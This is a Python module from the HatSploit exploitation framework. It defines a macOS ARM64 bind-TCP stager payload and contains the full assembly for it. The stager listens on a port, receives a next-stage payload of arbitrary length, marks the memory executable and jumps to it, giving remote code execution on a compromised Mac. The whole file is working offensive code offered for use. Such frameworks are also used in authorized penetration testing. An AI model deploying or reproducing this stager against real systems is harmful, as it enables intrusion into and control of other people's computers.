"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "macOS aarch64 Bind TCP",
            'Payload': "macos/aarch64/bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive bind TCP connection for macOS "
                "with aarch64 (M1, M2, M3, etc.) architecture and reads next stage."
            ),
            'Arch': ARCH_AARCH64,
            'Platform': OS_MACOS,
            'Type': BIND_TCP,
        })

        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            mov x0, 2
            mov x1, 1
            mov x2, 0
            mov x16, 0x61
            svc 0

            mov x12, x0
            adr x1, addr
            mov x2, 16
            mov x16, 0x68
            svc 0

            mov x0, x12
            mov x1, 2
            mov x16, 0x6a
            svc 0

            mov x0, x12
            eor x1, x1, x1
            eor x2, x2, x2
            mov x16, 0x1e
            svc 0

            mov x12, x0
        """

        if self.length.value:
            assembly += f"""
                mov x14, {hex(self.length.value)}
            """

        else:
            assembly += """
                mov x0, x12
                sub sp, sp, 16
                mov x1, sp
                mov x2, 4
                mov x3, 0x40
                mov x4, xzr
                mov x5, xzr
                mov x16, 0x1d
                svc 0

                ldr w2, [sp, 0]
                mov x14, x2
            """

        assembly += """
            mov x0, xzr
            mov x1, x14
            mov x2, 2
            mov x3, 0x1002
            mvn x4, xzr
            mov x5, xzr
            mov x16, 0xc5
            svc 0

            mov x13, x0
            mov x1, x13
            mov x2, x14
            mov x0, x12
            mov x3, 0x40
            mov x4, xzr
            mov x5, xzr
            mov x16, 0x1d
            svc 0

            mov x0, x13
            mov x1, x14
            mov x2, 5
            mov x16, 0x4a
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cbnz w0, fail
            """

        assembly += """
            br x13
        """

        if self.reliable.value:
            assembly += """
            fail:
                mov x0, 1
                mov x16, 0x1
                svc 0
            """

        assembly += f"""
        addr:
            .short 0x2
            .short 0x{self.rport.little.hex()}
            .word 0x0
        """

        return self.__asm__(assembly)
